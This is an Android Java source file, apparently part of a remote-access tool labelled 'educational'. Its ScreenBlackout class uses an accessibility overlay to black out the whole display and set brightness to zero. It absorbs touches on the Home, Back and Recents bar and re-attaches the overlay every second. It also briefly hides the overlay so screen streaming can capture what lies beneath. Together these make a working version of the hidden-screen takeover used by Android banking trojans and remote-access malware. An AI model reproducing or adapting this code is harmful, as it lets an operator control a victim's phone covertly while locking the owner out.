package com.remoteaccess.educational.commands;

import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import org.json.JSONObject;

/**
 * ScreenBlackout — draws a full-screen opaque black overlay using TYPE_ACCESSIBILITY_OVERLAY.
 *
 * - Covers status bar (top), notification panel, navigation bar (home/back/recents, bottom).
 * - Sets screenBrightness = 0f (hardware brightness to zero) on the layout params.
 * - Uses FLAG_LAYOUT_NO_LIMITS so the overlay extends beyond all system UI insets.
 * - A 1-second "keep-on-top" loop re-applies the overlay every second to prevent
 *   any system UI from appearing on top after the block is enabled.
 * - runWithOverlayHidden() hides/shows the overlay on the main thread but runs the
 *   capture task on the CALLER'S thread (avoids deadlock with captureScreenSync).
 *
 * Navigation-bar touch guard:
 * - A second, smaller overlay sits on top of the main blackout and covers only the
 *   navigation-bar strip at the bottom of the screen.
 * - Unlike the main overlay (FLAG_NOT_TOUCHABLE — touches pass through), the nav-bar
 *   overlay absorbs all touches so the user cannot tap Home / Back / Recents while
 *   the block screen is active.
 * - The rest of the display is unaffected: touches above the nav bar pass through the
 *   main overlay normally, so remote-control interactions still reach the app.
 */
public class ScreenBlackout {

    private static final String TAG = "ScreenBlackout";

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Object  lock        = new Object();

    private UnifiedAccessibilityService service      = null;
    private View                        overlayView  = null;
    private WindowManager.LayoutParams  overlayParams = null;
    private boolean                     active       = false;
    private boolean                     viewAttached = false;

    // Navigation-bar touch-guard overlay — separate small view anchored to the bottom
    private View    navBarOverlayView  = null;
    private boolean navBarAttached     = false;

    private static volatile ScreenBlackout instance;

    public static ScreenBlackout getInstance() {
        if (instance == null) {
            synchronized (ScreenBlackout.class) {
                if (instance == null) instance = new ScreenBlackout();
            }
        }
        return instance;
    }

    private ScreenBlackout() {}

    /** Called by UnifiedAccessibilityService.onServiceConnected() */
    public void setService(UnifiedAccessibilityService svc) {
        synchronized (lock) { this.service = svc; }
        Log.i(TAG, "Accessibility service registered — block screen ready");
    }

    /** Called by UnifiedAccessibilityService.onUnbind() */
    public void clearService() {
        synchronized (lock) {
            stopKeepOnTopLoop();
            if (active) removeOverlay();
            this.service = null;
        }
        Log.i(TAG, "Accessibility service unregistered");
    }

    public boolean isActive() {
        synchronized (lock) { return active; }
    }

    // ── Keep-on-top loop ─────────────────────────────────────────────────────

    /**
     * Every 1 second: check if overlay is still at top. If not, re-add it.
     * This prevents the flashing caused by blindly removing/re-adding every time.
     */
    private final Runnable keepOnTopRunnable = new Runnable() {
        @Override
        public void run() {
            synchronized (lock) {
                if (!active || overlayView == null
                        || overlayParams == null || service == null) return;
                try {
                    WindowManager wm = (WindowManager)
                            service.getSystemService(android.content.Context.WINDOW_SERVICE);

                    // Re-attach main blackout overlay if system detached it
                    if (!overlayView.isAttachedToWindow()) {
                        wm.addView(overlayView, overlayParams);
                        viewAttached = true;
                        Log.d(TAG, "keep-on-top: main overlay re-attached");
                    }

                    // Re-attach nav-bar guard overlay if system detached it
                    if (navBarOverlayView != null && !navBarOverlayView.isAttachedToWindow()) {
                        WindowManager.LayoutParams nbp = buildNavBarParams(wm);
                        wm.addView(navBarOverlayView, nbp);
                        navBarAttached = true;
                        Log.d(TAG, "keep-on-top: nav-bar overlay re-attached");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "keep-on-top error: " + e.getMessage());
                }
            }
            mainHandler.postDelayed(this, 1000);
        }
    };

    private void startKeepOnTopLoop() {
        mainHandler.removeCallbacks(keepOnTopRunnable);
        mainHandler.postDelayed(keepOnTopRunnable, 1000);
    }

    private void stopKeepOnTopLoop() {
        mainHandler.removeCallbacks(keepOnTopRunnable);
    }

    // ── Nav-bar overlay params builder ────────────────────────────────────────

    /**
     * Build WindowManager.LayoutParams for the navigation-bar touch-guard overlay.
     * The overlay is anchored to the BOTTOM of the screen, height = navBarH + safety margin.
     * It intentionally omits FLAG_NOT_TOUCHABLE so all touches in the nav-bar strip are
     * absorbed (Home / Back / Recents become inoperable while the block is active).
     */
    private WindowManager.LayoutParams buildNavBarParams(WindowManager wm) {
        android.graphics.Point displaySize = new android.graphics.Point();
        wm.getDefaultDisplay().getRealSize(displaySize);
        int realW = displaySize.x;

        int navBarH = 0;
        try {
            android.content.res.Resources res = service.getResources();
            int resId = res.getIdentifier("navigation_bar_height", "dimen", "android");
            if (resId > 0) navBarH = res.getDimensionPixelSize(resId);
        } catch (Exception ignored) {}
        if (navBarH <= 0) navBarH = 120;

        // Add a small safety margin so gesture-navigation swipe handles are also covered
        int guardH = navBarH + 40;

        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                realW,
                guardH,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                // FLAG_NOT_FOCUSABLE only — NO FLAG_NOT_TOUCHABLE so touches are absorbed.
                // FLAG_LAYOUT_NO_LIMITS extends beyond any bottom inset on gesture-nav phones.
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.OPAQUE
        );
        p.gravity = Gravity.BOTTOM | Gravity.START;
        p.x = 0;
        p.y = 0;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
            p.layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
        return p;
    }

    // ── Enable ───────────────────────────────────────────────────────────────

    /**
     * Enable block screen — covers the entire display including status bar,
     * notification panel, AND navigation bar (home/back/recents).
     *
     * Key design decisions:
     * 1. FLAG_NOT_TOUCHABLE: touches pass through to accessibility layer.
     * 2. screenBrightness = 0f: dims the physical screen to zero.
     * 3. FLAG_LAYOUT_NO_LIMITS: extends beyond screen bounds in all directions.
     * 4. Overlay shifted UP by (statusBarH + padding) and height includes
     *    both statusBarH (top) + navBarH (bottom) so nothing is exposed.
     * 5. 1-second keep-on-top loop re-adds the overlay to maintain z-order.
     */
    public JSONObject enableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (active) {
                    result.put("success", true);
                    result.put("message", "Screen block already active");
                    return result;
                }
                if (service == null) {
                    result.put("success", false);
                    result.put("error", "Accessibility service not running — enable it first");
                    return result;
                }
            }

            final Object latch      = new Object();
            final boolean[] done    = {false};
            final boolean[] success = {false};

            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) {
                    try {
                        if (service == null || active) return;

                        View v = new View(service);
                        v.setBackgroundColor(Color.BLACK);

                        // Real physical display size (includes all insets)
                        android.graphics.Point displaySize = new android.graphics.Point();
                        WindowManager wmDisp = (WindowManager)
                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
                        wmDisp.getDefaultDisplay().getRealSize(displaySize);
                        int realW = displaySize.x;
                        int realH = displaySize.y;

                        // Status bar height (top inset)
                        int statusBarH = 0;
                        try {
                            int resId = service.getResources().getIdentifier(
                                    "status_bar_height", "dimen", "android");
                            if (resId > 0)
                                statusBarH = service.getResources().getDimensionPixelSize(resId);
                        } catch (Exception ignored) {}
                        if (statusBarH <= 0) statusBarH = 80;

                        // Navigation bar height (bottom inset — home/back/recents)
                        int navBarH = 0;
                        try {
                            int resId = service.getResources().getIdentifier(
                                    "navigation_bar_height", "dimen", "android");
                            if (resId > 0)
                                navBarH = service.getResources().getDimensionPixelSize(resId);
                        } catch (Exception ignored) {}
                        if (navBarH <= 0) navBarH = 120; // safe fallback ~40dp @ 3x

                        // Extra padding to cover display cutouts and rounded corners
                        int extra = 80;

                        // Overlay positioned to cover: status bar (top) + screen + nav bar (bottom)
                        // Y is negative to push the top of the overlay above the status bar.
                        // Height is expanded to also extend below the screen into the nav bar zone.
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                realW,
                                realH + statusBarH + navBarH + extra * 2,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                                PixelFormat.OPAQUE
                        );
                        params.x = 0;
                        params.y = -(statusBarH + extra); // shift up to cover status bar

                        // Cover display cutouts on Android 9+ (notch / punch-hole)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode =
                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }

                        // Dim physical screen brightness to zero
                        params.screenBrightness = 0f;

                        WindowManager wm = (WindowManager)
                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
                        wm.addView(v, params);

                        overlayView   = v;
                        overlayParams = params;
                        active        = true;
                        viewAttached  = true;

                        // ── Navigation-bar touch-guard overlay ────────────────
                        // Separate, smaller overlay anchored to the bottom of the screen.
                        // Covers only the nav-bar strip and absorbs all touches there,
                        // preventing the user from pressing Home / Back / Recents.
                        try {
                            View nbView = new View(service);
                            nbView.setBackgroundColor(Color.BLACK);
                            WindowManager.LayoutParams nbParams = buildNavBarParams(wm);
                            wm.addView(nbView, nbParams);
                            navBarOverlayView = nbView;
                            navBarAttached    = true;
                            Log.i(TAG, "Nav-bar touch guard ENABLED (h=" + nbParams.height + ")");
                        } catch (Exception nbEx) {
                            Log.e(TAG, "Nav-bar overlay attach failed: " + nbEx.getMessage());
                        }

                        success[0] = true;
                        Log.i(TAG, "Screen block ENABLED — covers status bar + screen + nav bar (h="
                                + params.height + " y=" + params.y + ")");
                    } catch (Exception e) {
                        Log.e(TAG, "enableBlackout error: " + e.getMessage());
                    }
                }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            synchronized (lock) {
                if (success[0]) {
                    // Start 1-second loop to keep overlay on top of any system UI
                    startKeepOnTopLoop();
                    result.put("success", true);
                    result.put("message", "Screen block enabled — full display covered including navigation bar");
                } else {
                    result.put("success", false);
                    result.put("error", "Failed to attach overlay — accessibility service may not be active");
                }
            }
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    // ── Disable ──────────────────────────────────────────────────────────────

    /** Disable block screen — stops the keep-on-top loop and removes the overlay. */
    public JSONObject disableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (!active && !viewAttached) {
                    result.put("success", true);
                    result.put("message", "Screen block already inactive");
                    return result;
                }
            }

            // Stop keep-on-top loop before touching the view to avoid a race
            stopKeepOnTopLoop();

            final Object latch   = new Object();
            final boolean[] done = {false};

            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) { removeOverlay(); }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            result.put("success", true);
            result.put("message", "Screen block disabled — brightness restored");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Must be called on main thread while holding lock. */
    private void removeOverlay() {
        WindowManager wm = service != null
                ? (WindowManager) service.getSystemService(android.content.Context.WINDOW_SERVICE)
                : null;

        // Remove main blackout overlay
        try {
            if (overlayView != null && viewAttached && wm != null) {
                wm.removeView(overlayView);
            }
        } catch (Exception e) {
            Log.e(TAG, "disableBlackout removeView (main): " + e.getMessage());
        } finally {
            overlayView   = null;
            overlayParams = null;
            active        = false;
            viewAttached  = false;
        }

        // Remove nav-bar touch-guard overlay
        try {
            if (navBarOverlayView != null && navBarAttached && wm != null) {
                wm.removeView(navBarOverlayView);
            }
        } catch (Exception e) {
            Log.e(TAG, "disableBlackout removeView (nav-bar): " + e.getMessage());
        } finally {
            navBarOverlayView = null;
            navBarAttached    = false;
        }

        Log.i(TAG, "Screen block DISABLED — brightness restored, nav-bar guard removed");
    }

    // ── Screenshot helper ─────────────────────────────────────────────────────

    /**
     * Briefly hide the overlay so the streaming thread can capture real content,
     * then immediately restore it.
     *
     * Design:
     * - Hide and restore both run at the FRONT of the main-thread queue.
     * - The hide step waits at most 30 ms for the main thread to execute.
     * - The capture runs on the CALLER'S background thread (avoids deadlock).
     * - The restore is posted at the FRONT of the queue right after capture.
     */
    public void runWithOverlayHidden(Runnable captureTask) {
        boolean isActive;
        synchronized (lock) { isActive = active && viewAttached && overlayView != null; }

        if (!isActive) {
            captureTask.run();
            return;
        }

        final Object hideLatch   = new Object();
        final boolean[] hideDone = {false};

        mainHandler.postAtFrontOfQueue(() -> {
            synchronized (lock) {
                if (overlayView != null) overlayView.setVisibility(View.INVISIBLE);
                if (navBarOverlayView != null) navBarOverlayView.setVisibility(View.INVISIBLE);
            }
            synchronized (hideLatch) { hideDone[0] = true; hideLatch.notifyAll(); }
        });

        synchronized (hideLatch) {
            long deadline = System.currentTimeMillis() + 30;
            while (!hideDone[0] && System.currentTimeMillis() < deadline) {
                try { hideLatch.wait(5); } catch (InterruptedException ignored) { break; }
            }
        }

        try {
            captureTask.run();
        } finally {
            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) {
                    if (active && viewAttached && overlayView != null) {
                        overlayView.setVisibility(View.VISIBLE);
                    }
                    if (navBarOverlayView != null && navBarAttached) {
                        navBarOverlayView.setVisibility(View.VISIBLE);
                    }
                }
            });
        }
    }
}
